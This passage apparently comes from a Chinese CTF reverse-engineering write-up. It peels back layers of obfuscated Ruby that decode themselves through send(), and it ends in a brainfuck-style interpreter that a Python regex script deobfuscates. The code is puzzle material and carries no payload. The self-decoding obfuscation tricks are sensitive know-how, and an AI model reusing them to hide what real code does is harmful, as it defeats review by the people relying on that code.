class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>%<span class="hljs-number">8</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ll1I</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>|<span class="hljs-number">8</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ll11</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>^<span class="hljs-number">6</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ll1l1I</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>|<span class="hljs-number">1</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lI1Il</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>|<span class="hljs-number">3</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">llI1I</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>+<span class="hljs-number">6</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">llIl1</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>*<span class="hljs-number">4</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lI1ll</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>*<span class="hljs-number">5</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">l1111</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>^<span class="hljs-number">7</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">l1lII</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>^<span class="hljs-number">4</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lIIl</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>%<span class="hljs-number">5</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lII11</span></span>()<span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>+<span class="hljs-number">9</span>;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lI11I</span></span>()<span class="hljs-variable">$llll</span>=<span class="hljs-variable">$llll</span>+<span class="hljs-variable">$l1lI1l</span>.chr;<span class="hljs-keyword">end</span>;<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">l1IlI</span></span>()send(<span class="hljs-variable">$llll</span>[0,<span class="hljs-number">4</span>], <span class="hljs-variable">$llll</span>[<span class="hljs-number">4</span>,<span class="hljs-variable">$llll</span>.length]);<span class="hljs-keyword">end</span>;l11I1I;lII11;lI1ll;llI1I;lI11I;l11I1I;l1llI;lII11;lI1ll;l1llI;lIl1l;lIl1l;lIl1l;lI11I;l11I1I;ll1l1I;lII11;lI1ll;lIl1l;lI11I;l11I1I;lII11;l1lll;llIl1;lI11I;l11I1I;lII11;lI1ll;llI1I;lIl1l;lI11I;l11I1I;lII11;lI1ll;llI1I;lI11I;l11I1I;l1llI;lII11;llIl1;l1llI;lI11I;l11I1I;l1llI;llI1I;lI1ll;lI11I;l11I1I;llI1I;ll11;lI1ll;lI11I;l11I1I;l1llI;l1111;llIl1;lI11I;l11I1I;l1llI;ll11;llIl1;lI11I;l11I1I;lII11;lI1ll;lI11I;l11I1I;l1llI;llIl1;ll1l1I;lI11I;l11I1I;l1llI;ll11;llIl1;lI11I;l11I1I;l1llI;ll11;llIl1;lI11I;l11I1I;lI1ll;lIl1l;lI11I;l11I1I;l1llI;ll11;llIl1;lI11I;l11I1I;l1llI;ll1<br>......【节选】<br></code></pre></td></tr></table></figure><p>继续用第一层处理方法处理第二层代码，得到如下代码：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">$llll</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-variable">$llII</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func1</span><span class="hljs-params">()</span></span><br><span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span><span class="hljs-params">|7;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func2()</span><br><span class="hljs-params">$l1lI1l=$l1lI1l%7;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func3()</span><br><span class="hljs-params">$l1lI1l=$l1lI1l/4;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func4()</span><br><span class="hljs-params">$l1lI1l=$l1lI1l-3;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func5()</span><br><span class="hljs-params">$l1lI1l=$l1lI1l|</span><span class="hljs-number">10</span>;<br><span class="hljs-keyword">end</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func6</span><span class="hljs-params">()</span></span><br><span class="hljs-variable">$l1lI1l</span>=<span class="hljs-number">10</span>;<br><span class="hljs-keyword">end</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func7</span><span class="hljs-params">()</span></span><br><span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>&amp;<span class="hljs-number">7</span>;<br><span class="hljs-keyword">end</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func8</span><span class="hljs-params">()</span></span><br><span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span>%<span class="hljs-number">8</span>;<br><span class="hljs-keyword">end</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func9</span><span class="hljs-params">()</span></span><br><span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span><span class="hljs-params">|8;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func10()</span><br><span class="hljs-params">$l1lI1l=$l1lI1l^6;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func11()</span><br><span class="hljs-params">$l1lI1l=$l1lI1l|</span><span class="hljs-number">1</span>;<br><span class="hljs-keyword">end</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func12</span><span class="hljs-params">()</span></span><br><span class="hljs-variable">$l1lI1l</span>=<span class="hljs-variable">$l1lI1l</span><span class="hljs-params">|3;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func13()</span><br><span class="hljs-params">$l1lI1l=$l1lI1l+6;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func14()</span><br><span class="hljs-params">$l1lI1l=$l1lI1l*4;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func15()</span><br><span class="hljs-params">$l1lI1l=$l1lI1l*5;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func16()</span><br><span class="hljs-params">$l1lI1l=$l1lI1l^7;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func17()</span><br><span class="hljs-params">$l1lI1l=$l1lI1l^4;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func18()</span><br><span class="hljs-params">$l1lI1l=$l1lI1l%5;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func19()</span><br><span class="hljs-params">$l1lI1l=$l1lI1l+9;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func20()</span><br><span class="hljs-params">$llll=$llll+$l1lI1l.chr;</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">def func21()</span><br><span class="hljs-params">send($llll[0,4], $llll[4,$llll.length]);</span><br><span class="hljs-params"><span class="hljs-keyword">end</span>;</span><br><span class="hljs-params"></span><br><span class="hljs-params">func6;</span><br><span class="hljs-params">func19;</span><br><span class="hljs-params">func15;</span><br><span class="hljs-params">func13;</span><br><span class="hljs-params">.....[节选]</span><br></code></pre></td></tr></table></figure><p>继续输出 func21 中 send 的参数得到第三层 ruby 程序</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">begin</span> <span class="hljs-variable">$_</span>=<span class="hljs-variable">$$</span>/<span class="hljs-variable">$$</span>;<br><span class="hljs-variable">@_</span>=<span class="hljs-variable">$_</span>+<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$-</span>_=<span class="hljs-variable">$_</span>-<span class="hljs-variable">@_</span>;<br><span class="hljs-variable">$__</span>=-&gt;_&#123;_==[]<span class="hljs-params">||</span>_==<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-variable">$.</span><span class="hljs-symbol">:</span><span class="hljs-variable">$_</span>+<span class="hljs-variable">$__</span>[_[<span class="hljs-variable">$_</span>..<span class="hljs-variable">$-</span>_]]&#125;<br><span class="hljs-variable">@__</span>=-&gt;_,&amp;__&#123;_==[]?[]<span class="hljs-symbol">:</span>[__[_[<span class="hljs-variable">$.</span>]]]+<span class="hljs-variable">@__</span>[_[<span class="hljs-variable">$_</span>..<span class="hljs-variable">$-</span>_],&amp;__]&#125;<br><span class="hljs-variable">$_____</span>=-&gt;_&#123;<span class="hljs-variable">@__</span>[[*_],&amp;-&gt;__&#123;__[<span class="hljs-variable">$.</span>]&#125;]&#125;<br><span class="hljs-variable">@_____</span>=-&gt;_&#123;<span class="hljs-variable">@__</span>[[*_],&amp;-&gt;__&#123;__[<span class="hljs-variable">$-</span>_]&#125;]&#125;<br><span class="hljs-variable">$______</span>=-&gt;_&#123;___,______=<span class="hljs-variable">$_____</span>[_],<span class="hljs-variable">@_____</span>[_];_____=<span class="hljs-variable">$__</span>[___];____=&#123;&#125;;__=<span class="hljs-variable">$.</span>;(_=-&gt;&#123;<br>  ____[______[__]]=___[__];(__+=<span class="hljs-variable">$_</span>)==_____ ?<span class="hljs-symbol">____:</span>_[]&#125;)[]&#125;<br><span class="hljs-variable">@______</span>=-&gt;_,__&#123;_=[*_]+[*__];____=<span class="hljs-variable">$__</span>[_];___=&#123;&#125;;__=<span class="hljs-variable">$.</span>;(_____=-&gt;&#123;<br>  ___[_[__][<span class="hljs-variable">$.</span>]]=_[__][<span class="hljs-variable">$_</span>];(__+=<span class="hljs-variable">$_</span>)==____ ?<span class="hljs-symbol">___:</span>_____[]&#125;)[]&#125;<br><span class="hljs-variable">$_______</span>=-&gt;_&#123;<span class="hljs-variable">$___</span>=[];<span class="hljs-variable">@___</span>=<span class="hljs-variable">$__</span>[_];__=___=____=<span class="hljs-variable">$.</span>;<span class="hljs-variable">$____</span>,<span class="hljs-variable">@____</span>=&#123;&#125;,[]<br>(_____=-&gt;&#123;<br>  _[____]==<span class="hljs-string">&#x27;5&#x27;</span>?(<span class="hljs-variable">@____</span>&lt;&lt;____)<span class="hljs-symbol">:</span><span class="hljs-variable">$.</span><br>  _[____]==<span class="hljs-string">&#x27;6&#x27;</span>?(<span class="hljs-variable">$____</span>[<span class="hljs-variable">@____</span>[<span class="hljs-variable">$-</span>_]]=____;<span class="hljs-variable">@____</span>=<span class="hljs-variable">@____</span>[<span class="hljs-variable">$.</span>..<span class="hljs-variable">$.</span>-<span class="hljs-variable">@_</span>])<span class="hljs-symbol">:</span><span class="hljs-variable">$.</span><br>  (____+=<span class="hljs-variable">$_</span>)==<span class="hljs-variable">@__</span>_?<span class="hljs-variable">$.</span><span class="hljs-symbol">:_____[]</span>&#125;)[]<br><span class="hljs-variable">$____</span>=<span class="hljs-variable">$____</span>==&#123;&#125;?&#123;&#125;<span class="hljs-symbol">:</span><span class="hljs-variable">@______</span>[<span class="hljs-variable">$____</span>,<span class="hljs-variable">$______</span>[<span class="hljs-variable">$____</span>]]<br>(______=-&gt;&#123;_[__]==<br><span class="hljs-string">&#x27;0&#x27;</span>?(<span class="hljs-variable">$___</span>[___]<span class="hljs-params">||</span>=<span class="hljs-variable">$.</span>;<span class="hljs-variable">$___</span>[___]+=<span class="hljs-variable">$_</span>)<span class="hljs-symbol">:_</span>[__]==<br><span class="hljs-string">&#x27;1&#x27;</span>?(<span class="hljs-variable">$___</span>[___]<span class="hljs-params">||</span>=<span class="hljs-variable">$.</span>;<span class="hljs-variable">$___</span>[___]-=<span class="hljs-variable">$_</span>)<span class="hljs-symbol">:_</span>[__]==<br><span class="hljs-string">&#x27;2&#x27;</span>?(<span class="hljs-variable">$___</span>[___]<span class="hljs-params">||</span>=<span class="hljs-variable">$.</span>;<span class="hljs-variable">$___</span>[___]=STDIN.getc.ord)<span class="hljs-symbol">:_</span>[__]==<br><span class="hljs-string">&#x27;3&#x27;</span><span class="hljs-string">?(</span>___+=<span class="hljs-variable">$_</span>)<span class="hljs-symbol">:_</span>[__]==<br><span class="hljs-string">&#x27;4&#x27;</span><span class="hljs-string">?(</span>___-=<span class="hljs-variable">$_</span>)<span class="hljs-symbol">:_</span>[__]==<br><span class="hljs-string">&#x27;5&#x27;</span><span class="hljs-string">?(</span>__=(<span class="hljs-variable">$___</span>[___]<span class="hljs-params">||</span><span class="hljs-variable">$.</span>)==<span class="hljs-variable">$.</span><span class="hljs-string">?$</span>____[__]<span class="hljs-symbol">:__</span>)<span class="hljs-symbol">:_</span>[__]==<br><span class="hljs-string">&#x27;6&#x27;</span><span class="hljs-string">?(</span>__=(<span class="hljs-variable">$___</span>[___]<span class="hljs-params">||</span><span class="hljs-variable">$.</span>)!=<span class="hljs-variable">$.</span><span class="hljs-string">?$</span>____[__]<span class="hljs-symbol">:__</span>)<span class="hljs-symbol">:_</span>[__]==<br><span class="hljs-string">&#x27;7&#x27;</span>?(<span class="hljs-variable">$&gt;</span>&lt;&lt;(<span class="hljs-string">&#x27;&#x27;</span>&lt;&lt;<span class="hljs-variable">$___</span>[___]))<span class="hljs-symbol">:</span><span class="hljs-variable">$.</span><br>(__+=<span class="hljs-variable">$_</span>)==<span class="hljs-variable">@__</span>_?<span class="hljs-symbol">_:</span>______[]&#125;)[]&#125;<br><span class="hljs-variable">$_______</span>[<span class="hljs-string">&#xx27;</span>];<span class="hljs-keyword">rescue</span> Exception;<span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><h2 id="第三层-ruby-程序"><a href="#第三层-ruby-程序" class="headerlink" title="第三层 ruby 程序"></a>第三层 ruby 程序</h2><p>主要是变量名的反混淆，用正则表达式匹配后替换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br>data = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;3.rb&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br>target = <span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;\$_[^_]&quot;</span>, data, re.M | re.S):<br>    <span class="hljs-keyword">if</span> i[-<span class="hljs-number">1</span>] != <span class="hljs-string">&quot;=&quot;</span>:<br>        print(i)<br>        data = data.replace(i, target + i[-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># @_</span><br>target = <span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;@_[^_]&quot;</span>, data, re.M | re.S):<br>    <span class="hljs-keyword">if</span> i[-<span class="hljs-number">1</span>] != <span class="hljs-string">&quot;=&quot;</span>:<br>        print(i)<br>        data = data.replace(i, target + i[-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># $-_ =&gt; -1</span><br><br>target = <span class="hljs-string">&#x27;-1&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;\$-_[^_]&quot;</span>, data, re.M | re.S):<br>    <span class="hljs-keyword">if</span> i[-<span class="hljs-number">1</span>] != <span class="hljs-string">&quot;=&quot;</span>:<br>        print(i)<br>        data = data.replace(i, target + i[-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># $__ -&gt; proc1</span><br><br>target = <span class="hljs-string">&#x27;$proc1&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;\$__[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, target + i[-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># @__</span><br>target = <span class="hljs-string">&#x27;@proc2&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;@__[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, target + i[-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># $_____</span><br>target = <span class="hljs-string">&#x27;$proc3&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;\$_____[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, target + i[-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># @_____</span><br>target = <span class="hljs-string">&#x27;@proc4&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;@_____[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, target + i[-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># $______</span><br>target = <span class="hljs-string">&#x27;$proc5&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;\$______[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, target + i[-<span class="hljs-number">1</span>])<br><br><br><span class="hljs-comment"># @______</span><br>target = <span class="hljs-string">&#x27;@proc6&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;@______[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, target + i[-<span class="hljs-number">1</span>])<br><br>target = <span class="hljs-string">&#x27;@varX&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;@___[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, target + i[-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># $_______</span><br>target = <span class="hljs-string">&#x27;$proc7&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;\$_______[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, target + i[-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># $___</span><br>target = <span class="hljs-string">&#x27;$arr1&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;\$___[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, target + i[-<span class="hljs-number">1</span>])<br><br><br><br><span class="hljs-comment"># $____</span><br>target = <span class="hljs-string">&#x27;$var3&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;\$____[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, target + i[-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># @____</span><br>target = <span class="hljs-string">&#x27;@var4&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;@____[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, target + i[-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># [^_]____[^_]</span><br>target = <span class="hljs-string">&#x27;var5&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;[^_]____[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, i[<span class="hljs-number">0</span>] + target + i[-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># [^_]___[^_]</span><br>target = <span class="hljs-string">&#x27;var6&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;[^_]___[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, i[<span class="hljs-number">0</span>] + target + i[-<span class="hljs-number">1</span>])<br><br><br><span class="hljs-comment"># ______</span><br>target = <span class="hljs-string">&#x27;var7&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;[^_]______[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, i[<span class="hljs-number">0</span>] + target + i[-<span class="hljs-number">1</span>])<br><br><span class="hljs-comment"># _____</span><br>target = <span class="hljs-string">&#x27;var8&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;[^_]_____[^_]&quot;</span>, data, re.M | re.S):<br>    print(i)<br>    data = data.replace(i, i[<span class="hljs-number">0</span>] + target + i[-<span class="hljs-number">1</span>])<br>    data = data.replace(i, i[<span class="hljs-number">0</span>] + target + i[-<span class="hljs-number">1</span>])<br><br>data = data.replace(<span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;;\n&quot;</span>, -<span class="hljs-number">1</span>)<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;out4.rb&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>).write(data)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    print(e)<br><br></code></pre></td></tr></table></figure><p>处理后结果如下</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 